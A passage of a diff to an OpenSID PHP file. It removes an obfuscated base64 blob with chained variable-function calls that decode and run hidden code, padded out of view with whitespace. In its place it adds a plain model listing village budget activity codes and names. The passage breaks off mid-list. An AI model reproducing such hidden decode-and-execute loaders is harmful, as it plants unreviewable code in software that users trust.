EM5sjvnMXg012P+gpUsofhQx/9K4yw4z3q5VzdiBGmOrUg1XiaWge3qmPgtHoYeVbZv/xYqet2jxFT5PYX6Qa63KGyfhfRFNdYveDRN/l79nn4xcx7XnnO7MQi9fCnkKaAXYsc0IsR0/7XEuMJdaz6H4pjVFfQomdIzJ28Q/Xh0vcD+2PwD3nPGdQzVrzcX6sUlqlMrQqrtjnVKdLP13kS+rpsTCnYq/Bh1Apa3dSslZIz8t/pZh1bL7FhFVuqozRi2eJOfCCvg/1aZ33CZ5mwCO/s3xpVpudYhXZ2NYz1NcB6/1IFsALvBeQ9W8rlAuxGVTlDPjiGjvBXMTHAt3YrAPcK4u1iPtX5jfT7iatyr9/PPddocyI75slTFIh30eVsf1Vc8Iin3Tmtj6rMsVYpUP52LqMne0nxj6CFPPiM8IiVzsp4DWU++b++JztJvA3FX6HYpccH5tV+yS79hvNzLKqenn5nCN7Dsd1jM1p1GnT94bXFbg3OVpgD2xvkvB+L/wcwoF04O/xAJ+7jcf2K8+7HzEmUKgnJPbmCmP3zvs5LZwDk08/2JWB9jKHe3nq0eZ7DvwaT9A+uA7vFzN8zFnQ/BClNCtkZrE/XGHmP6v/1ProuF8GtKn6rm+ANzsOJeb5XzE30X03A1jnuw/y2LjfgZ5YX/b7RBxXhbonc83XG+w/AHrJ7D8QszdD6uP1v9cnsaG+XOq56uuob089IrxWOat2wv4rmqrF6R1Dibn+1+iVI1u9o57J2nx/li//sI+i5XtaWZeZPHZ0mq0YdeYTeE4OsdSc4kulPWe9o13IzK9vXyMHZmaBs6aZBWO/lM8abfYTZxxNaWcN65vGuPOEXzrbpaCSvyYSs8uF+eu0z6aLc3an0165qzKY13YLn+ZPq+QV8ZghFeWVUdLAWZsHxDuwnZPf28/iEwb0DfUN6CPQQRAnFOgXU2yJdNV7HT6D8hxP+AL01BJj+q/2v5R6bl/LcexPOx8/wn3cIS6RYWI6FVYGX0Oy/f41v2OGm6X9jfGhed9aao9ffv7hhx9vd/zpH3T8Qr//zP/6z5//yMtrr/09L/zT6QP//AX//8v/rT62uvL/+OHz3+e/f7d/P5zLwJ/PhI6JwH/+/P8BF9FGmA==';
-
-        $___();$__________($______($__($_))); $________=$____();
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                                     $________;
+<?php
+
+/*
+ *
+ * File ini bagian dari:
+ *
+ * OpenSID
+ *
+ * Sistem informasi desa sumber terbuka untuk memajukan desa
+ *
+ * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
+ *
+ * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
+ * Hak Cipta 2016 - 2025 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
+ *
+ * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
+ * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
+ * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
+ * asal tunduk pada syarat berikut:
+ *
+ * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
+ * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
+ * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
+ *
+ * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
+ * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
+ * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
+ *
+ * @package   OpenSID
+ * @author    Tim Pengembang OpenDesa
+ * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
+ * @copyright Hak Cipta 2016 - 2025 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
+ * @license   http://www.gnu.org/licenses/gpl.html GPL V3
+ * @link      https://github.com/OpenSID/OpenSID
+ *
+ */
+
+defined('BASEPATH') || exit('No direct script access allowed');
+
+class KeuanganManualRefKegiatan extends CI_Model
+{
+    public function getData()
+    {
+        return [
+            [
+                'id'            => 1,
+                'ID_Keg'        => '01.01.01.',
+                'Nama_Kegiatan' => 'Penyediaan Penghasilan Tetap dan Tunjangan Kepala Desa',
+            ],
+            [
+                'id'            => 2,
+                'ID_Keg'        => '01.01.02.',
+                'Nama_Kegiatan' => 'Penyediaan Penghasilan Tetap dan Tunjangan Perangkat Desa',
+            ],
+            [
+                'id'            => 3,
+                'ID_Keg'        => '01.01.03.',
+                'Nama_Kegiatan' => 'Penyediaan Jaminan Sosial bagi Kepala Desa dan Perangkat Desa',
+            ],
+            [
+                'id'            => 4,
+                'ID_Keg'        => '01.01.04.',
+                'Nama_Kegiatan' => 'Penyediaan Operasional Pemerintah Desa (ATK, Honor PKPKD dan PPKD dll)',
+            ],
+            [
+                'id'            => 5,
+                'ID_Keg'        => '01.01.05.',
+                'Nama_Kegiatan' => 'Penyediaan Tunjangan BPD',
+            ],
+            [
+                'id'            => 6,
+                'ID_Keg'        => '01.01.06.',
+                'Nama_Kegiatan' => 'Penyediaan Operasional BPD (rapat, ATK, Makan Minum, Pakaian Seragam, Listrik dll)',
+            ],
+            [
+                'id'            => 7,
+                'ID_Keg'        => '01.01.07.',
+                'Nama_Kegiatan' => 'Penyediaan Insentif\\/Operasional RT\\/RW',
+            ],
+            [
+                'id'            => 8,
+                'ID_Keg'        => '01.01.92',
+                'Nama_Kegiatan' => 'Lain-lain Sub Bidang Siltap dan Operasional Pemerintahan Desa',
+            ],
+            [
+                'id'            => 9,
+                'ID_Keg'        => '01.02.01.',
+                'Nama_Kegiatan' => 'Penyediaan Sarana (Aset Tetap) Perkantoran\\/Pemerintahan',
+            ],
+            [
+                'id'            => 10,
+                'ID_Keg'        => '01.02.02.',
+                'Nama_Kegiatan' => 'Pemeliharaan Gedung\\/Prasarana Kantor Desa',
+            ],
+            [
+                'id'            => 11,
+                'ID_Keg'        => '01.02.03.',
+                'Nama_Kegiatan' => 'Pembangunan\\/Rehabilitasi\\/Peningkatan Gedung\\/Prasarana Kantor Desa **)',
+            ],
+            [
+                'id'            => 12,
+                'ID_Keg'        => '01.02.90',
+                'Nama_Kegiatan' => 'Lain-lain Sub Bidang Sarana Prasarana Pemerintahan Desa',
+            ],
+            [
+                'id'            => 13,
+                'ID_Keg'        => '01.03.01.',
+                'Nama_Kegiatan' => 'Pelayanan Administrasi Umum dan  Kependudukan',
+            ],
+            [
+                'id'            => 14,
+                'ID_Keg'        => '01.03.02.',
+                'Nama_Kegiatan' => 'Penyusunan, Pendataan, dan Pemutakhiran Profil Desa **)',
+            ],
+            [
+                'id'            => 15,
+                'ID_Keg'        => '01.03.03.',
+                'Nama_Kegiatan' => 'Pengelolaan Adminstrasi dan Kearsipan Pemerintahan Desa',
+            ],
+            [
+                'id'            => 16,
+                'ID_Keg'        => '01.03.04.',
+                'Nama_Kegiatan' => 'Penyuluhan dan Penyadaran Masyarakat tentang Kependudukan dan Capil',
+            ],
+            [
+                'id'            => 17,
+                'ID_Keg'        => '01.03.05.',
+                'Nama_Kegiatan' => 'Pemetaan dan Analisis Kemiskinan Desa secara Partisipatif',
+            ],
+            [
+                'id'            => 18,
+                'ID_Keg'        => '01.03.90',
+                'Nama_Kegiatan' => 'Lain-lain Sub Bidang Administrasi Kependudukan, Capil, Statistik dan Kearsipan',
+            ],
+            [
+                'id'            => 19,
+                'ID_Keg'        => '01.04.01.',
+                'Nama_Kegiatan' => 'Penyelenggaraan Musyawarah Perencanaan Desa\\/Pembahasan APBDes (Reguler)',
+            ],
+            [
+                'id'            => 20,
+                'ID_Keg'        => '01.04.02.',
+                'Nama_Kegiatan' => 'Penyelenggaraan Musyawaran Desa Lainnya (Musdus, rembug desa Non Reguler)',
+            ],
+            [
+                'id'            => 21,
+                'ID_Keg'        => '01.04.03.',
+                'Nama_Kegiatan' => 'Penyusunan Dokumen Perencanaan Desa (RPJMDesa\\/RKPDesa dll)',
+            ],
+            [
+                'id'            => 22,
+                'ID_Keg'        => '01.04.04.',
+                'Nama_Kegiatan' => 'Penyusunan Dokumen Keuangan Desa (APBDes, APBDes Perubahan, LPJ dll)',
+            ],
+            [
+                'id'            => 23,
+                'ID_Keg'        => '01.04.05.',
+                'Nama_Kegiatan' => 'Pengelolaan Administrasi\\/ Inventarisasi\\/Penilaian Aset Desa',
+            ],
+            [
+                'id'            => 24,
+                'ID_Keg'        => '01.04.06.',
+                'Nama_Kegiatan' => 'Penyusunan Kebijakan Desa (Perdes\\/Perkades selain Perencanaan\\/Keuangan)',
+            ],
+            [
+                'id'            => 25,
+                'ID_Keg'        => '01.04.07.',
+                'Nama_Kegiatan' => 'Penyusunan Laporan Kepala Desa, LPPDesa dan Informasi Kepada Masyarakat',
+            ],
+            [
+                'id'            => 26,
+                'ID_Keg'        => '01.04.08.',
+                'Nama_Kegiatan' => 'Pengembangan Sistem Informasi Desa',
+            ],
+            [
+                'id'            => 27,
+                'ID_Keg'        => '01.04.09.',
+                'Nama_Kegiatan' => 'Koordinasi\\/Kerjasama Penyelenggaraan Pemerintahan & Pembangunan Desa',
+            ],
+            [
+                'id'            => 28,
+                'ID_Keg'        => '01.04.10.',
+                'Nama_Kegiatan' => 'Dukungan & Sosialisasi Pelaksanaan Pilkades, Pemilihan Ka. Kewilayahan & BPD',
+            ],
+            [
+                'id'            => 29,
+                'ID_Keg'        => '01.04.11.',
+                'Nama_Kegiatan' => 'Penyelenggaran Lomba antar Kewilayahan & Pengiriman Kontingen dlm Lomdes',
+            ],
+            [
+                'id'            => 30,
+                'ID_Keg'        => '01.04.97',
+                'Nama_Kegiatan' => 'Lain-lain Sub Bidang Tata Praja Pemerintahan, Perencanaan, Keuangan & Pelaporan',
+            ],
+            [
+                'id'            => 31,
+                'ID_Keg'        => '01.05.01.',
+                'Nama_Kegiatan' => 'Sertifikasi Tanah Kas Desa',
+            ],
+            [
+                'id'            => 32,
+                'ID_Keg'        => '01.05.02.',
+                'Nama_Kegiatan' => 'Administrasi Pertanahan (Pendaftaran Tanah dan Pemberian Registrasi Agenda Pertanahan)',
+            ],
+            [
+                'id'            => 33,
+                'ID_Keg'        => '01.05.03.',
+                'Nama_Kegiatan' => 'Fasilitasi Sertifikasi Tanah untuk Masyarakat Miskin',
+            ],
+            [
+                'id'            => 34,
+                'ID_Keg'        => '01.05.04.',
+                'Nama_Kegiatan' => 'Kegiatan Mediasi Konflik Pertanahan',
+            ],
+            [
+                'id'            => 35,
+                'ID_Keg'        => '01.05.05.',
+                'Nama_Kegiatan' => 'Kegiatan Penyuluhan Pertanahan',
+            ],
+            [
+                'id'            => 36,
+                'ID_Keg'        => '01.05.06.',
+                'Nama_Kegiatan' => 'Adminstrasi Pajak Bumi dan Bangunan (PBB)',
+            ],
+            [
+                'id'            => 37,
+                'ID_Keg'        => '01.05.07.',
+                'Nama_Kegiatan' => 'Penentuan\\/Penegasan Batas\\/patok Tanah Kas Desa',
+            ],
+            [
+                'id'            => 38,
+                'ID_Keg'        => '01.05.94',
+                'Nama_Kegiatan' => 'Lain-lain Sub Bidang Pertanahan',
+            ],
+            [
+                'id'            => 39,
+                'ID_Keg'        => '02.01.01',
+                'Nama_Kegiatan' => 'Penyelenggaran PAUD\\/TK\\/TPA\\/TKA\\/TPQ\\/Madrasah NonFormal Milik Desa (Honor, Pakaian dll)',
+            ],
+            [
+                'id'            => 40,
+                'ID_Keg'        => '02.01.02.',
+                'Nama_Kegiatan' => 'Dukungan Penyelenggaran PAUD (APE, Sarana PAUD dst)',
+            ],
+            [
+                'id'            => 41,
+                'ID_Keg'        => '02.01.03.',
+                'Nama_Kegiatan' => 'Penyuluhan dan Pelatihan Pendidikan Bagi Masyarakat',
+            ],
+            [
+                'id'            => 42,
+                'ID_Keg'        => '02.01.04.',
+                'Nama_Kegiatan' => 'Pemeliharaan Sarana Prasarana Perpustakaan\\/Taman Bacaan\\/Sanggar Belajar Milik Desa',
+            ],
+            [
+                'id'            => 43,
+                'ID_Keg'        => '02.01.05.',
+                'Nama_Kegiatan' => 'Pemeliharaan Sarana Prasarana PAUD\\/TK\\/TPA\\/TKA\\/TPQ\\/Madrasah Nonformal Milik Desa',
+            ],
+            [
+                'id'            => 44,
+                'ID_Keg'        => '02.01.08.',
+                'Nama_Kegiatan' => 'Pengelolaan Perpustakaan Milik Desa (Pengadaan Buku, Honor, Taman Baca)',
+            ],
+            [
+                'id'            => 45,
+                'ID_Keg'        => '02.01.09.',
+                'Nama_Kegiatan' => 'Pengembangan dan Pembinaan Sanggar Seni dan Belajar',
+            ],
+            [
+                'id'            => 46,
+                'ID_Keg'        => '02.01.10.',
+                'Nama_Kegiatan' => 'Dukungan Pendidikan bagi Siswa Miskin\\/Berprestasi',
+            ],
+            [
+                'id'            => 47,
+                'ID_Keg'        => '02.01.92',
+                'Nama_Kegiatan' => 'Lain-lain Kegiatan Sub Bidang Pendidikan',
+            ],
+            [
+                'id'            => 48,
+                'ID_Keg'        => '02.02.01.',
+                'Nama_Kegiatan' => 'Penyelenggaraan Pos Kesehatan Desa\\/Polindes Milik Desa (obat, Insentif, KB, dsb)',
+            ],
+            [
+                'id'            => 49,
+                'ID_Keg'        => '02.02.02.',
+                'Nama_Kegiatan' => 'Penyelenggaraan Posyandu (Mkn Tambahan, Kls Bumil, Lamsia, Insentif)',
+            ],
+            [
+                'id'            => 50,
+                'ID_Keg'        => '02.02.03.',
+                'Nama_Kegiatan' => 'Penyuluhan dan Pelatihan Bidang Kesehatan (Untuk Masy, Tenaga dan Kader Kesehatan dll)',
+            ],
+            [
+                'id'            => 51,
+                'ID_Keg'        => '02.02.04.',
+                'Nama_Kegiatan' => 'Penyelenggaraan Desa Siaga Kesehatan',
+            ],
+            [
+                'id'            => 52,
+                'ID_Keg'        => '02.02.05.',
+                'Nama_Kegiatan' => 'Pembinaan Palang Merah Remaja (PMR) Tingkat Desa',
+            ],
+            [
+                'id'            => 53,
+                'ID_Keg'        => '02.02.06.',
+                'Nama_Kegiatan' => 'Pengasuhan Bersama atau Bina Keluarga Balita (BKB)',
+            ],
+            [
+                'id'            => 54,
+                'ID_Keg'        => '02.02.07.',
+                'Nama_Kegiatan' => 'Pembinaan dan Pengawasan Upaya Kesehatan Tradisional',
+            ],
+            [
+                'id'            => 55,
+                'ID_Keg'        => '02.02.08.',
+                'Nama_Kegiatan' => 'Pemeliharaan Sarana Prasarana Posyandu\\/Polindes\\/PKD',
+            ],
+            [
+                'id'            => 56,
+                'ID_Keg'        => '02.03.01.',
+                'Nama_Kegiatan' => 'Pemeliharaan Jalan Desa',
+            ],
+            [
+                'id'            => 57,
+                'ID_Keg'        => '02.03.02.',
+                'Nama_Kegiatan' => 'Pemeliharaan Jalan Lingkungan Pemukiman\\/Gang',
+            ],
+            [
+                'id'            => 58,
+                'ID_Keg'        => '02.03.03.',
+                'Nama_Kegiatan' => 'Pemeliharaan Jalan Usaha Tani',
+            ],
+            [
+                'id'            => 59,
+                'ID_Keg'        => '02.03.04.',
+                'Nama_Kegiatan' => 'Pemeliharaan Jembatan Desa',
+            ],
+            [
+                'id'            => 60,
+                'ID_Keg'        => '02.03.05.',
+                'Nama_Kegiatan' => 'Pemeliharaan Prasarana Jalan Desa (Gorong-gorong\\/Selokan\\/Parit\\/Drainase dll)',
+            ],
+            [
+                'id'            => 61,
+                'ID_Keg'        => '02.03.06.',
+                'Nama_Kegiatan' => 'Pemeliharaan Gedung\\/Prasarana Balai Desa\\/Balai Kemasyarakatan',
+            ],
+            [
+                'id'            => 62,
+                'ID_Keg'        => '02.03.07.',
+                'Nama_Kegiatan' => 'Pemeliharaan Pemakaman \\/Situs Bersejarah\\/Petilasan Milik Desa',
+            ],
+            [
+                'id'            => 63,
+                'ID_Keg'        => '02.03.08.',
+                'Nama_Kegiatan' => 'Pemeliharaan Embung Milik Desa',
+            ],
+            [
+                'id'            => 64,
+                'ID_Keg'        => '02.03.09.',
+                'Nama_Kegiatan' => 'Pemelharaan Monumen\\/Gapura\\/Batas Desa',
+            ],
+            [
+                'id'            => 65,
+                'ID_Keg'        => '02.03.10.',
+                'Nama_Kegiatan' => 'Pembangunan\\/Rehabilitas\\/Peningkatan\\/Pengerasan Jalan Desa **)',
+            ],
+            [
+                'id'            => 66,
+                'ID_Keg'        => '02.03.12.',
+                'Nama_Kegiatan' => 'Pembangunan\\/Rehabilitasi\\/Peningkatan\\/Pengerasan Jalan Usaha Tani **)',
+            ],
+            [
+                'id'            => 67,
+                'ID_Keg'        => '02.03.13.',
+                'Nama_Kegiatan' => 'Pembangunan\\/Rehabilitasi\\/Peningkatan\\/Pengerasan Jembatan Milik Desa **)',
+            ],
+            [
+                'id'            => 68,
+                'ID_Keg'        => '02.03.14.',
+                'Nama_Kegiatan' => 'Pembangunan\\/Rehabilitasi\\/Peningkatan Prasarana Jalan Desa (Gorong, selokan dll)',
+            ],
+            [
+                'id'            => 69,
+                'ID_Keg'        => '02.03.15.',
+                'Nama_Kegiatan' => 'Pembangunan\\/Rehabilitasi\\/Peningkatan Balai Desa\\/Balai Kemasyarakatan **)',
+            ],
+            [
+                'id'            => 70,
+                'ID_Keg'        => '02.03.17.',
+                'Nama_Kegiatan' => 'Pembuatan\\/Pemutakhiran Peta Wilayah dan Sosial Desa **)',
+            ],
+            [
+                'id'            => 71,
+                'ID_Keg'        => '02.03.18.',
+                'Nama_Kegiatan' => 'Penyusunan Dokumen Perencanaan Tata Ruang Desa',
+            ],
+            [
+                'id'            => 72,
+                'ID_Keg'        => '02.03.19.',
+                'Nama_Kegiatan' => 'Pembangunan\\/Rehabilitasi\\/Peningkatan Embung Desa **)',
+            ],
+            [
+                'id'            => 73,
+                'ID_Keg'        => '02.03.20.',
+                'Nama_Kegiatan' => 'Pembangunan\\/Rehabilitasi\\/Peningkatan Monumen\\/Gapura\\/Batas Desa **)',
+            ],
+            [
+                'id'            => 74,
+                'ID_Keg'        => '02.04.01.',
+                'Nama_Kegiatan' => 'Dukungan Pelaksanaan Program Pembangunan\\/Rehab Rumah Tidak Layak Huni GAKIN',
+            ],
+            [
+                'id'            => 75,
+                'ID_Keg'        => '02.04.90',
+                'Nama_Kegiatan' => 'Dukungan Pelaksanaan Program Jambanisasi untuk Keluarga Miskin',
+            ],
+            [
+                'id'            => 76,
+                'ID_Keg'        => '02.04.02.',
+                'Nama_Kegiatan' => 'Pemeliharaan Sumur Resapan Milik Desa',
+            ],
+            [
+                'id'            => 77,
+                'ID_Keg'        => '02.04.03.',
+                'Nama_Kegiatan' => 'Pemeliharaan Sumber Air Bersih Milik Desa (Mata Air, Penampung Air, Sumur Bor dll)',
+            ],
+            [
+                'id'            => 78,
+                'ID_Keg'        => '02.04.04.',
+                'Nama_Kegiatan' => 'Pemeliharaan Sambungan Air Bersih ke Rumah Tangga (Pipanisasi dll)',
+            ],
+            [
+                'id'            => 79,
+                'ID_Keg'        => '02.04.05.',
+                'Nama_Kegiatan' => 'Pemeliharaan Sanitasi Pemukiman (Gorong-gorong, Selokan, Parit diluar Prasarana Jalan))',
+            ],
+            [
+                'id'            => 80,
+                'ID_Keg'        => '02.04.06.',
+                'Nama_Kegiatan' => 'Pemeliharaan Fasilitas Jamban Umum\\/MCK Umum dll',
+            ],
+            [
+                'id'            => 81,
+                'ID_Keg'        => '02.04.08.',
+                'Nama_Kegiatan' => 'Pemeliharaan Sistem Pembuangan Air Limbah (Drainase, Air limbah Rumah Tangga)',
+            ],
+            [
+                'id'            => 82,
+                'ID_Keg'        => '02.04.09.',
+                'Nama_Kegiatan' => 'Pemeliharaan Taman\\/Taman Bermain Anak Milik Desa',
+            ],
+            [
+                'id'            => 83,
+                'ID_Keg'        => '02.04.10.',
+                'Nama_Kegiatan' => 'Pembangunan\\/Rehabilitasi\\/Peningkatan Sumur Resapan **)',
+            ],
+            [
+                'id'            => 84,
+                'ID_Keg'        => '02.04.11.',
+                'Nama_Kegiatan' => 'Pembangunan\\/Rehabilitasi\\/Peningkatan Sumber Air Bersih Milik Desa **)',
+            ],
+            [
+                'id'            => 85,
+                'ID_Keg'        => '02.04.12.',
+                'Nama_Kegiatan' => 'Pembangunan\\/Rehabilitasi\\/Peningkatan Sambungan Air Bersih ke Rumah Tangga **)',
+            ],
+            [
+                'id'            => 86,
+                'ID_Keg'        => '02.04.13.',
+                'Nama_Kegiatan' => 'Pembangunan\\/Rehabilitasi\\/Peningkatan Sanitasi Permukiman **)',
+            ],
+            [
+                'id'            => 87,
+                'ID_Keg'        => '02.04.14.',
+                'Nama_Kegiatan' => 'Pembangunan\\/Rehabilitas\\/Peningkatan Fasilitas Jamban Umum\\/MCK umum, dll **)',
+            ],
+            [
+                'id'            => 88,
+                'ID_Keg'        => '02.04.15.',
+                'Nama_Kegiatan' => 'Pembangunan\\/Rehabilitasi\\/Peningkatan Fasilitas Pengelolaan Sampah **)',
+            ],
+            [
+                'id'            => 89,
+                'ID_Keg'        => '02.04.16.',
+                'Nama_Kegiatan' => 'Pembangunan\\/Rehabilitasi\\/Peningkatan Sistem Pembuangan Air Limbah **)',
+            ],
+            [
+                'id'            => 90,
+                'ID_Keg'        => '02.04.17.',
+                'Nama_Kegiatan' => 'Pembangunan\\/Rehabilitasi\\/Peningkatan Taman\\/Taman Bermain Anak Milik Desa **)',
+            ],
+            [
+                'id'            => 91,
+                'ID_Keg'        => '02.04.94',
+                'Nama_Kegiatan' => 'Lain-lain Kegiatan Sub Bidang Perumahan Rakyat dan Kawasan Pemukiman',
+            ],
+            [
+                'id'            => 92,
+                'ID_Keg'        => '02.05.01.',
+                'Nama_Kegiatan' => 'Pengelolaan Hutan Milik Desa',
+            ],
+            [
+                'id'            => 93,
+                'ID_Keg'        => '02.05.02.',
+                'Nama_Kegiatan' => 'Pengelolaan Lingkungan Hidup Milik Desa',
+            ],
+            [
+                'id'            => 94,
+                'ID_Keg'        => '02.05.92',
+                'Nama_Kegiatan' => 'Lain-lain Kegiatan Sub Bidang Kehutanan dan Lingkungan Hidup',
+            ],
+            [
+                'id'            => 95,
+                'ID_Keg'        => '02.06.01.',
+                'Nama_Kegiatan' => 'Pembuatan Rambu-rambu di Jalan Desa',
+            ],
+            [
+                'id'            => 96,
+                'ID_Keg'        => '02.06.02.',
+                'Nama_Kegiatan' => 'Penyelenggaraan Informasi Publik Desa (Poster, Baliho Dll)',
+            ],
+            [
+                'id'            => 97,
+                'ID_Keg'        => '02.06.03.',
+                'Nama_Kegiatan' => 'Pembuatan dan Pengelolaan Jaringan\\/Instalasi Komunikasi dan Informasi Lokal Desa',
+            ],
+            [
+                'id'            => 98,
+                'ID_Keg'        => '02.06.92',
+                'Nama_Kegiatan' => 'Lain-lain Kegiatan Sub Bidang Perhubungan, Komunikasi dan Informatika',
+            ],
+            [
+                'id'            => 99,
+                'ID_Keg'        => '02.07.01.',
+                'Nama_Kegiatan' => 'Pemeiliharaan Sarana dan Prasarana Energi Alternatif Desa',
+            ],
+            [
+                'id'            => 100,
+                'ID_Keg'        => '02.07.02.',
+                'Nama_Kegiatan' => 'Pembangunan\\/Rehabilitasi\\/Peningkatan Sarana & Prasarana Energi Alternatif Desa',
+            ],
+            [
+                'id'            => 101,
+                'ID_Keg'        => '02.07.93',
+                'Nama_Kegiatan' => 'Pembangunan\\/pengadaan instalasi biogas\\/mesin pakan ternak\\/kandang ternak**',
+            ],
+            [
+                'id'            => 102,
+                'ID_Keg'        => '02.08.01.',
+                'Nama_Kegiatan' => 'Pemeliharaan Sarana dan Prasarana Pariwisata Milik Desa',
+            ],
+            [
+                'id'            => 103,
+                'ID_Keg'        => '02.08.02.',
+                'Nama_Kegiatan' => 'Pembangunan\\/Rehabilitasi\\/Peningkatan Sarana dan Prasarana Pariwisata Milik **)',
+            ],
+            [
+                'id'            => 104,
+                'ID_Keg'        => '02.08.03.',
+                'Nama_Kegiatan' => 'Pengembangan Pariwisata Tingkat Desa',
+            ],
+            [
+                'id'            => 105,
+                'ID_Keg'        => '02.08.91',
+                'Nama_Kegiatan' => 'Lain-Lain Kegiatan Sub Bidang Pariwisata',
+            ],
+            [
+                'id'            => 106,
+                'ID_Keg'        => '03.01.01.',
+                'Nama_Kegiatan' => 'Pengadaan\\/Penyelenggaran Pos Keamanan Desa',
+            ],
+            [
+                'id'            => 107,
+                'ID_Keg'        => '03.01.02.',
+                'Nama_Kegiatan' => 'Penguatan & Peningkatan Kapasitas Tenaga Keamanan\\/Ketertiban oleh Pemdes',
+            ],
+            [
+                'id'            => 108,
+                'ID_Keg'        => '03.01.03.',
+                'Nama_Kegiatan' => 'Koordinasi Pembinaan Keamanan, Ketertiban & Perlindungan Masy. Skala Lokal Desa',
+            ],
+            [
+                'id'            => 109,
+                'ID_Keg'        => '03.01.04.',
+                'Nama_Kegiatan' => 'Persiapan Kesiapsiagaan\\/Tanggap Bencana Skala Lokal Desa',
+            ],
+            [
+                'id'            => 110,
+                'ID_Keg'        => '03.01.05.',
+                'Nama_Kegiatan' => 'Penyediaan Pos Kesiapsiagaan Bencana Skala Lokal Desa',
+            ],
+            [
+                'id'            => 111,
+                'ID_Keg'        => '03.01.06.',
+                'Nama_Kegiatan' => 'Bantuan Hukum Untuk Aparatur Desa dan Masyarakat Miskin',
+            ],
+            [
+                'id'            => 112,
+                'ID_Keg'        => '03.01.92',
+                'Nama_Kegiatan' => 'Lain-lain Kegiatan Sub Bidang Ketenteraman, Ketertiban Umum dan Perlindungan Masyarakat',
+            ],
+            [
+                'id'            => 113,
+                'ID_Keg'        => '03.02.01.',
+                'Nama_Kegiatan' => 'Pembinaan Group Kesenian dan Kebudayaan Tingkat Desa',
+            ],
+            [
+                'id'            => 114,
+                'ID_Keg'        => '03.02.02.',
+                'Nama_Kegiatan' => 'Pengiriman Kontingen Group Kesenian & Kebudayaan (Wakil Desa tkt. Kec\\/Kab\\/Kot)',
+            ],
+            [
+                'id'            => 115,
+                'ID_Keg'        => '03.02.03.',
+                'Nama_Kegiatan' => 'Penyelenggaran Festival Kesenian, Adat\\/Kebudayaan, dan Kegamaan (HUT RI, Raya Keagamaan dll)',
+            ],
+            [
+                'id'            => 116,
+                'ID_Keg'        => '03.02.04.',
+                'Nama_Kegiatan' => 'Pemeliharaan Sarana Prasarana Kebudayaan, Rumah Adat dan Kegamaan Milik Desa',
+            ],
+            [
+                'id'            => 117,
+                'ID_Keg'        => '03.02.05.',
+                'Nama_Kegiatan' => 'Pembangunan\\/Rehabilitasi Sarana Prasarana Kebudayaan\\/Rumah Adat\\/Kegamaan Milik Desa **)',
+            ],
+            [
+                'id'            => 118,
+                'ID_Keg'        => '03.02.95',
+                'Nama_Kegiatan' => 'Lain-lain Kegiatan Sub Bidang Kebudayaan dan Keagamaan',
+            ],
+            [
+                'id'            => 119,
+                'ID_Keg'        => '03.03.01.',
+                'Nama_Kegiatan' => 'Pengiriman Kontingen Kepemudaan & Olahraga Sebagai Wakil Desa tkt Kec\\/Kab\\/Kota',
+            ],
+            [
+                'id'            => 120,
+                'ID_Keg'        => '03.03.02.',
+                'Nama_Kegiatan' => 'Penyelenggaraan Pelatihan Kepemudaan Tingkat Desa',
+            ],
+            [
+                'id'            => 121,
+                'ID_Keg'        => '03.03.03.',
+                'Nama_Kegiatan' => 'Penyelenggaraan Festival\\/Lomba Kepemudaan dan Olaraga Tingkat Desa',
+            ],
+            [
+                'id'            => 122,
+                'ID_Keg'        => '03.03.04.',
+                'Nama_Kegiatan' => 'Pemeliharaan Sarana dan Prasarana Kepemudaan dan Olahraga Milik Desa',
+            ],
